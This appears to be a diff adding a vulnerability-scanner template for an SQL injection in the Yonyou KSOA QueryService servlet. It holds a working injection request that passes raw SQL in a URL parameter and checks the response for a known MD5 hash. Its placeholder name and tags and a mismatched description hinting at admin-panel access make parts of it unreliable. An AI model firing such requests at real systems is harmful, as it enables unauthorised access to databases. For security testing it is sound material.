@@ -1,0 +1,18 @@
+id: yoyou-KSOA-QueryService-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 返回登录页面刷新一下进后台。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA%E6%8E%A5%E5%8F%A3com.sksoft.bill.QueryService%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/com.sksoft.bill.QueryService?service=query&content=SELECT%20HashBytes('md5','1');"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
